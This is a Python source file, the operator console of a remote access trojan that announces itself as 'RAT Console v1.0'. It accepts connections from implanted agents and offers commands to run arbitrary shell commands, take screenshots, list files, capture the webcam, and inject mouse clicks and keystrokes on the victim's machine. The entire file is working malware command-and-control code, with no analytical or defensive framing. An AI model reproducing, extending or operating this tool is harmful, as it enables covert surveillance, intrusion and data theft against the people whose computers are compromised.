import asyncio
import logging
import time
from pathlib import Path

from rat.protocol import SecureTransport, Message, MsgType, handshake_server

logger = logging.getLogger("rat.console")

class Console:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.transport = None
        self.agent_id = None

    async def run(self):
        server = await asyncio.start_server(self.handle_client, self.host, self.port)
        logger.info(f"Console listening on {self.host}:{self.port}")
        
        async with server:
            await server.serve_forever()

    async def handle_client(self, reader, writer):
        peer = writer.get_extra_info("peername")
        logger.info(f"Agent connected from {peer}")
        
        try:
            self.transport = await handshake_server(reader, writer)
            
            msg = await self.transport.recv()
            if msg and msg.type == MsgType.REGISTER:
                self.agent_id = msg.meta.get("id")
                logger.info(f"Agent ID: {self.agent_id}")
                await self.transport.send(Message(type=MsgType.REGISTER_OK))
                
                await self.run_cli()
        except Exception as e:
            logger.error(f"Client error: {e}")
        finally:
            writer.close()

    async def run_cli(self):
        print(f"\n=== RAT Console v1.0 ===")
        print(f"Agent: {self.agent_id}\n")
        print("Commands: screenshot | exec <cmd> | ls <path> | webcam | mouse <x> <y> | type <text> | quit\n")
        
        while True:
            try:
                cmd_input = await asyncio.get_event_loop().run_in_executor(
                    None, lambda: input("RAT> ").strip()
                )
                
                if not cmd_input:
                    continue
                
                parts = cmd_input.split(maxsplit=1)
                cmd = parts[0]
                args = parts[1] if len(parts) > 1 else ""
                
                if cmd == "quit":
                    break
                
                await self.execute_command(cmd, args)
                
            except (KeyboardInterrupt, EOFError):
                break
            except Exception as e:
                logger.error(f"Command error: {e}")

    async def execute_command(self, cmd, args):
        if cmd == "screenshot":
            await self.transport.send(Message(type=MsgType.SCREENSHOT))
            resp = await self.transport.recv()
            if resp and resp.payload:
                filename = f"screenshot_{int(time.time())}.jpg"
                Path(filename).write_bytes(resp.payload)
                print(f"Saved: {filename}")
        
        elif cmd == "exec":
            await self.transport.send(Message(type=MsgType.SHELL_EXEC, meta={"cmd": args}))
            resp = await self.transport.recv()
            if resp:
                print(resp.meta.get("stdout", "")[:2000])
                if resp.meta.get("stderr"):
                    print(f"ERROR: {resp.meta['stderr'][:500]}")
        
        elif cmd == "ls":
            await self.transport.send(Message(type=MsgType.LIST_FILES, meta={"path": args or "."}))
            resp = await self.transport.recv()
            if resp and resp.meta.get("files"):
                for f in resp.meta["files"][:30]:
                    icon = "D" if f["dir"] else "F"
                    size = f"({f['size']:,})" if not f["dir"] else ""
                    print(f"[{icon}] {f['name']:<40} {size}")
        
        elif cmd == "webcam":
            await self.transport.send(Message(type=MsgType.WEBCAM))
            resp = await self.transport.recv()
            if resp and resp.payload:
                Path("webcam.jpg").write_bytes(resp.payload)
                print("Saved: webcam.jpg")
        
        elif cmd == "mouse":
            x, y = map(int, args.split())
            await self.transport.send(Message(type=MsgType.INPUT_MOUSE, meta={"action": "click", "x": x, "y": y}))
            print("Clicked")
        
        elif cmd == "type":
            await self.transport.send(Message(type=MsgType.INPUT_KEYBOARD, meta={"action": "type", "text": args}))
            print("Typed")
        
        else:
            print(f"Unknown: {cmd}")
